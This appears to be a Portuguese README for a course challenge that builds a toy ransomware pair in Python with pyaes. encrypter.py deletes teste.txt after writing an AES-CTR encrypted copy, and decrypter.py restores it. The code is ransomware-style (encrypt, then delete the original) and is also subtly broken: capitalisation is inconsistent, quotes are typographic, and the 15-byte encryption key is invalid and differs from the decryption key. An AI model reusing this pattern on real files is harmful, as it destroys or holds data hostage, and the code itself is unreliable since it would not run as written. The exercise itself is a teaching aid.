# desafio-dio-ransomware
Desafio de criptografia e descriptografia.

1º ETAPA



Criar os Arquivos com o comando nano (usado para escrever/editar dentro de um arquivo) ou touch (usado para criar um arquivo) no terminal do Linux depois que estiver dentro da pasta “projeto-ransomware"



·        encrypter.py

·        decrypter.py

·        teste.txt



2º ETAPA



Escrever uma frase dentro do arquivo teste.txt usando o comando nano, exemplo “Este arquivo está legível”.



·        Salvar com o ctrl + o;

·        Depois de Enter;

·        Depois Ctrl + x



3º ETAPA



Escrever os comandos necessários dentro do arquivo encrypter.py usando o comando nano:

 

Import os

Import pyaes

 

## abrir o arquivo a ser criptografado

 

File­_name =‘teste.txt’

File = open(file_name, ‘rb’)

File_data = file.read()

File.close()

 

## remover o arquivo original

 

os.remove(file_name)

 

## chave de criptográfica

 

Key = b“testeransomware”

Aes = pyaes.AESModeOfOperationCTR(key)

 

## criptografar o arquivo

 

Crypto_data = aes.encrypt(file_data)

 

## salvar o arquivo criptografado

new_file = file_name + ‘.ransomwaretroll'

new_file = open(f‘{new_file}’,‘wb’)

new_file.write(crypto_data)

new_file.close()

 

Agora salvar com o Ctrl + O, Enter, depois Ctrl + x.

 

4º ETAPA



Escrever os comandos necessários dentro do arquivo decrypter.py usando o comando nano:



import os

import pyaes

 

## abrir o arquivo criptografado

file_name = ‘teste.txt.ransomwaretroll’

file = open(file_name, ‘rb’)

file_data = file.read()

file.close()

 

## chave para descriptografia

key = b‘testeransomwares’

aes = pyaes.AESModeOfOperationCTR(key)

decrypt_data = aes.decrypt(file_data)

 

## remover o arquivo criptografado

os.remove(file_name)

 

## criar o arquivo descriptografado

new_file = ‘teste.txt’

new_file = open(f'{new_file}', ‘wb’)

new_file.write(decrypt_data)

new_file.close()

 

Agora salvar com o Ctrl + O, Enter, depois Ctrl + x.



5º ETAPA FINAL


Realizar os comandos de criptografar, listar arquivos (para ver o resultado), descriptografar e listar arquivos novamente (para ver o resultado final)

python encrypter.py

ls

python decrypter.py

ls
